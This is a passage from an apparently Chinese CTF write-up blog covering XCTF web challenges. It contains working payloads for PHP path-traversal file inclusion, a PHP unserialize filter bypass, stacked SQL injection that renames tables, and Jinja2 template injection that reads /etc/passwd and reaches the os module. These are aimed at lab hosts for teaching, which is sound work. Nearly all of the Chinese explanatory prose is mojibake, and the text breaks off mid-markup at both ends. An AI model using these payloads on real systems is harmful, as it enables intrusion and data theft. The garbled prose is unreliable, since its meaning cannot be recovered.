class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®ç»“æœç›´æ¥å¾—åˆ°flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170953604.png"></p><h2 id="6-warmup-NO-GFSJ0743"><a href="#6-warmup-NO-GFSJ0743" class="headerlink" title="6.warmup-NO.GFSJ0743"></a>6.warmup-NO.GFSJ0743</h2><p>æŸ¥çœ‹æºç å‘ç°æ³¨é‡Šé‡Œæœ‰source.php<br>ç›´æ¥è®¿é—®,å¾—åˆ°æºç <br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170953810.png"></p> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="comment">#ç™½åå•ä¸­å­˜åœ¨ä¸¤ç»„é”®å€¼å¯¹</span></span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment">#pageä¸ºä¸ç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">#å¦‚æœpageåœ¨ç™½åå•é‡Œè¿”å›çœŸ</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#æˆªå–page,ä»ç¬¬ä¸€ä½å¼€å§‹æˆªå–åˆ°ç¬¬ä¸€ä¸ªï¼Ÿæ‰€åœ¨ä½</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="comment">#æˆªå–åçš„ç»“æœå¦‚æœåœ¨ç™½åå•ï¼Œè¿”å›ä¸ºçœŸ</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="comment">#fileä¸ä¸ºç©º</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    <span class="comment">#fileæ˜¯å­—ç¬¦ä¸²</span></span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        <span class="comment">#æ‰§è¡ŒcheckFileå‡½æ•°ç»“æœä¸ºçœŸ</span></span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">    <span class="comment">#æ–‡ä»¶åŒ…å«file</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>å®¡å®Œä»£ç å‘ç°æœ‰hint.php<br>è®¿é—®å¾—çŸ¥:flag not here, and flag in ffffllllaaaagggg</p><p>åœ¨urlä¸­ä½¿ç”¨..&#x2F;çš„æ—¶å€™ ..&#x2F;æœ€å‰é¢éšä¾¿å†™ä»€ä¹ˆéƒ½è¡Œï¼Œåªè¿”å›..&#x2F;æœ€åé¢çš„æ–‡ä»¶æ•°æ®ã€‚<br>æ‰€ä»¥åªè¦æ»¡è¶³å¤šä¸ª..&#x2F;å³å¯é€€å›æ ¹ç›®å½•ï¼Œå†æŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„ffffllllaaaagggg<br>ç™½åå•æ–‡ä»¶+â€˜ï¼Ÿâ€™+..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:55257/source.php?file=hint.php?../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170954425.png"></p><h2 id="7-NewCenter-NO-GFSJ0100"><a href="#7-NewCenter-NO-GFSJ0100" class="headerlink" title="7.NewCenter-NO.GFSJ0100"></a>7.NewCenter-NO.GFSJ0100</h2><p>ç¯å¢ƒä¸€ç›´æŠ¥é”™ï¼Œå…ˆè·³è¿‡<br>å¯å‚è€ƒæ–‡ç« :<a href="https://blog.csdn.net/m0_62619559/article/details/121256876">https://blog.csdn.net/m0_62619559/article/details/121256876</a></p><h2 id="8-Web-php-unserialize-NO-GFSJ0710"><a href="#8-Web-php-unserialize-NO-GFSJ0710" class="headerlink" title="8.Web_php_unserialize-NO.GFSJ0710"></a>8.Web_php_unserialize-NO.GFSJ0710</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#ä¼ å…¥var</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line"><span class="comment"># å…ˆå¯¹varbase64è§£ç </span></span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="comment">#åŒ¹é…</span></span><br><span class="line">    <span class="comment"># o/c : 1ä¸ªæˆ–å¤šä¸ªæ•°å­— ä¸”å¿½ç•¥å¤§å°å†™</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">#å¯¹varè¿›è¡Œè¿”å­¦åŠ£åŒ–</span></span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>O:æ•°å­—å’ŒC:æ•°å­—è¢«è¿‡æ»¤<br>ç»•è¿‡æ–¹æ³•: O:+4</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:4:&quot;</span>,<span class="string">&quot;:+4:&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:1:&quot;</span>,<span class="string">&quot;:2:&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170955712.png"></p><h2 id="9-supersqli-NO-GFSJ0718"><a href="#9-supersqli-NO-GFSJ0718" class="headerlink" title="9.supersqli-NO.GFSJ0718"></a>9.supersqli-NO.GFSJ0718</h2><p>æŠ¥é”™æ³¨å…¥æ­£å¸¸</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:59473/?inject=1%27%20and%20extractvalue(1,concat(0x7e,database(),0x7e))%20and%20%271%27=%271</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºåº“åsupersqli<br>æƒ³ç»§ç»­çˆ†ç ´ï¼Œå‘ç°select ,where,. éƒ½è¢«è¿‡æ»¤ï¼ŒçŒœæµ‹ä½¿ç”¨mysqlè¯­å¥ï¼Œä½¿ç”¨å †å æ³¨å…¥<br>æŸ¥çœ‹åº“å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170956068.png"></p><p>æŸ¥çœ‹è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show tables;#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170956749.png"><br>æŸ¥åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show columns from words;#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170958667.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171000210.png"></p><p>å› ä¸ºæ— æ³•ä½¿ç”¨selectè¯­å¥å°†å†…å®¹å–å‡ºï¼Œåªèƒ½å€ŸåŠ©é¢˜ç›®ä¸­æŸ¥æ•°æ®æ‰€ä½¿ç”¨çš„selectè¯­å¥<br>çŒœæµ‹åŸselectè¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from words where id=&#x27;&#x27;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡å°†wordsè¡¨æ”¹æˆå…¶ä»–çš„åå­—<br>å°†1919810931114514çš„è‡­è¡¨(bushi)åç§°æ”¹æˆwords<br>å†æŠŠflagåˆ—åæ”¹ä¸ºid<br>è¿™æ ·é€šè¿‡1â€™ or â€˜1â€™&#x3D;â€™1 å³å¯æŠŠ1919810931114514è¡¨é‡Œçš„æ‰€æœ‰å†…å®¹å–å‡º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line">rename table `words` to `other`;</span><br><span class="line">rename table `1919810931114514` to `words`;</span><br><span class="line">alter table `words` change `flag` `id` varchar(100);#</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶é€šè¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>æˆåŠŸå–å‡ºkey<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171001268.png"></p><h2 id="10-web2-NO-GFSJ0627"><a href="#10-web2-NO-GFSJ0627" class="headerlink" title="10.web2-NO.GFSJ0627"></a>10.web2-NO.GFSJ0627</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">Â  Â  <span class="comment">#å°†stråè½¬</span></span><br><span class="line">Â  Â  <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);</span><br><span class="line">Â  Â  <span class="keyword">echo</span> <span class="variable">$_o</span>;</span><br><span class="line">Â  Â  <span class="comment">#éå†$_oæ¯ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">Â  Â  <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="comment">#æˆªå–$_oçš„æ¯ä¸€ä½</span></span><br><span class="line">Â  Â  Â  Â  <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">Â  Â  Â  Â  <span class="comment">#å°†$_cè½¬å˜ä¸ºASCIIå†åŠ 1</span></span><br><span class="line">Â  Â  Â  Â  <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="comment">#å°†$__è½¬å›å­—ç¬¦</span></span><br><span class="line">Â  Â  Â  Â  <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);</span><br><span class="line">Â  Â  Â  Â  <span class="comment">#å°†è½¬å˜åçš„å­—ç¬¦å†æ¬¡æ‹¼æ¥æˆå­—ç¬¦ä¸²</span></span><br><span class="line">Â  Â  Â  Â  <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>; Â </span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="comment">#ROT13 ç¼–ç æ˜¯æŠŠæ¯ä¸€ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­å‘å‰ç§»åŠ¨ 13 ä¸ªå­—æ¯å¾—åˆ°</span></span><br><span class="line">Â  Â  <span class="comment">#strrevæ˜¯åè½¬</span></span><br><span class="line">Â  Â  <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆå§‹å­—ç¬¦ä¸² -&gt;åè½¬-&gt;æ¯ä¸€ä½å‘å‰ç§»åŠ¨1ä¸ªå­—æ¯-&gt;base64ç¼–ç -&gt;åè½¬-&gt;æ¯ä¸€ä½å‘å‰ç§»åŠ¨13ä¸ªå­—æ¯ã€‚</p><p>é€†å‘:<br>ç»“æœ-&gt;æ¯ä¸€ä½å‘åç§»åŠ¨13ä¸ªå­—æ¯-&gt;åè½¬-&gt;base64è§£ç -&gt;æ¯ä¸€ä½å‘åç§»åŠ¨ä¸€ä¸ªå­—æ¯-&gt;åè½¬ã€‚</p><p>ROT13 ç¼–ç æ˜¯æŠŠæ¯ä¸€ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­å‘å‰ç§»åŠ¨ 13 ä¸ªå­—æ¯å¾—åˆ°ã€‚æ•°å­—å’Œéå­—æ¯å­—ç¬¦ä¿æŒä¸å˜ã€‚å­—æ¯ä¸€å…±æœ‰26ä¸ªï¼Œæ‰€ä»¥æ‰§è¡Œäº†str_rot13çš„å†…å®¹ï¼Œå†æ‰§è¡Œä¸€æ¬¡str_rot13å³å¯æ¢å¤ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">Â  Â  <span class="variable">$_</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$str</span>);</span><br><span class="line">Â  Â  <span class="variable">$t</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_</span>);</span><br><span class="line">Â  Â  <span class="variable">$_</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$t</span>);</span><br><span class="line">Â  Â  <span class="keyword">for</span>(<span class="variable">$a0</span>=<span class="number">0</span>;<span class="variable">$a0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_</span>);<span class="variable">$a0</span>++)&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="comment">#æˆªå–$_oçš„æ¯ä¸€ä½</span></span><br><span class="line">Â  Â  Â  Â  <span class="variable">$_d</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_</span>,<span class="variable">$a0</span>,<span class="number">1</span>);</span><br><span class="line">Â  Â  Â  Â  <span class="comment">#å°†$_cè½¬å˜ä¸ºASCIIå†åŠ 1</span></span><br><span class="line">Â  Â  Â  Â  <span class="variable">$_1</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_d</span>)-<span class="number">1</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="comment">#å°†$__è½¬å›å­—ç¬¦</span></span><br><span class="line">Â  Â  Â  Â  <span class="variable">$_d</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$_1</span>);</span><br><span class="line">Â  Â  Â  Â  <span class="comment">#å°†è½¬å˜åçš„å­—ç¬¦å†æ¬¡æ‹¼æ¥æˆå­—ç¬¦ä¸²</span></span><br><span class="line">Â  Â  Â  Â  <span class="variable">$r</span>=<span class="variable">$r</span>.<span class="variable">$_d</span>; Â </span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="variable">$result</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$r</span>);</span><br><span class="line">Â  Â  <span class="keyword">echo</span> <span class="variable">$result</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171001723.png"></p><h2 id="11-Web-python-template-injection-NO-GFSJ0709"><a href="#11-Web-python-template-injection-NO-GFSJ0709" class="headerlink" title="11.Web_python_template_injection-NO.GFSJ0709"></a>11.Web_python_template_injection-NO.GFSJ0709</h2><p>å‚è€ƒæ–‡ç« :<a href="https://blog.csdn.net/Myon5/article/details/130072619">https://blog.csdn.net/Myon5/article/details/130072619</a></p><p>pythonæ¨¡å—æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¨¡æ¿å¼•æ“è®©ç½‘ç«™å®ç°ç•Œé¢ä¸æ•°æ®åˆ†ç¦»</span><br><span class="line">æ³¨å…¥æ¨¡æ¿å¯èƒ½ä¼šå¯¼è‡´RCE,XSS</span><br><span class="line">jinjaæ¨¡æ¿ä¸­&#123;&#123;&#125;&#125;æ˜¯å˜é‡åŒ…è£¹ç¬¦å·</span><br><span class="line">&#123;&#123;&#125;&#125;æ”¯æŒä¼ å…¥å˜é‡,ä¹Ÿæ”¯æŒä¸€äº›è¡¨è¾¾å¼</span><br><span class="line">flaskçš„æ¨¡æ¿æ¸²æŸ“å‡½æ•° render_template_stringä¸æ­£ç¡®ä½¿ç”¨ä¼šå¼•å‘ssti</span><br></pre></td></tr></table></figure><p>a.sstié­”æœ¯æ–¹æ³•<br>__class__  è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡<br>__mro__    è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æ<br>__base__   è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»(__base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„ï¼‰<br>__subclasses__   æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨<br>__init__  ç±»çš„åˆå§‹åŒ–æ–¹æ³•<br>__globals__  å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨<br>__builtins__  builtinså°±æ˜¯å¼•ç”¨</p><p>b.è·å–åŸºç±»æ–¹æ³•<br>[].__class__.__base__<br>â€˜â€™.__class__.__mro__[2]<br>().__class__.__base__<br>{}.__class__.__base__<br>request.__class__.__mro__[8] ã€€ã€€<br>[].__class__.__bases__[0]<br>è·å–åŸºæœ¬ç±»çš„å­ç±»<br>[].__class__.__base__.__subclasses__()</p><p>1.æµ‹è¯•æ˜¯å¦å­˜åœ¨æ¨¡æ¿æ³¨å…¥<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171002979.png"><br>å‘ç°1+1è¢«æ‰§è¡Œ</p><p>2.é¦–å…ˆæŸ¥æ‰¾Objectç±»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:63090/%7B%7B&#x27;&#x27;.__class__.__mro__[2]%7D%7D</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯Objectç±»</p><p>3.å¯»æ‰¾objectç±»çš„å­ç±»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:63090/%7B%7B&#x27;&#x27;.__class__.__mro__[2].__subclasses__()%7D%7D</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171003431.png"><br>åˆ©ç”¨&lt;type â€˜fileâ€™&gt;æ•°ä¸‹æ¥æ˜¯ç¬¬å››åä¸€ä¸ª,ç´¢å¼•ä»0å¼€å§‹<br>å³â€™â€™.__class__.__base__.__subclasses__()[40]</p><p>4.å°è¯•è¯»å–æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¯»å–<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171003737.png"><br>å°è¯•è¯»å–.&#x2F;flag &#x2F;flagå‡å¤±è´¥<br>å¯»æ‰¾å¯æ‰§è¡Œå‘½ä»¤çš„ç±»<br>&lt;class â€˜site._Printerâ€™&gt; å¯ç”¨äºæ‰§è¡Œå‘½ä»¤</p><p>5.å€ŸåŠ©site._Printeræ‰§è¡Œå‘½ä»¤<br>æ•°å‡ºæ¥æ˜¯ç¬¬72ä¸ª,æ‰§è¡Œls</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171004774.png"></p><p>6.å†å€ŸåŠ©fileç±»è¯»å–fl4gå³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:64350/%7B%7B[].__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()%7D%7D</span><br></pre></td></tr></table></figure><h2 id="12-catcatnew-NO-GFSJ1168"><a href="#12-catcatnew-NO-GFSJ1168" class="headerlink" title="12.catcatnew-NO.GFSJ1168"></a>12.catcatnew-NO.GFSJ1168</h2><p>æ½®æ±æŒ‡çº¹&#x3D;&gt;ç½‘ç«™ç”±pythonç¼–å†™<br>|ä¸­é—´ä»¶|Werkzeug&#x2F;2.2.2 Python&#x2F;3.7.12<br>æ¨æµ‹æ˜¯flaskæ¡†æ¶</p><p>è¯»å–app.pyæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:58061/info?file=../app.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, Markup</span><br><span class="line"><span class="keyword">from</span> cat <span class="keyword">import</span> cat</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">app = Flask(</span><br><span class="line">__name__,</span><br><span class="line">static_url_path=<span class="string">&#x27;/&#x27;</span>, </span><br><span class="line">static_folder=<span class="string">&#x27;static&#x27;</span> </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;*abcdefgh&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line">flag = cat(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">os.remove(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">detailtxt = os.listdir(<span class="string">&#x27;./details/&#x27;</span>)</span><br><span class="line">cats_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> detailtxt:</span><br><span class="line">cats_list.append(i[:i.index(<span class="string">&#x27;.&#x27;</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, cats_list=cats_list, cat=cat)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/info&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title 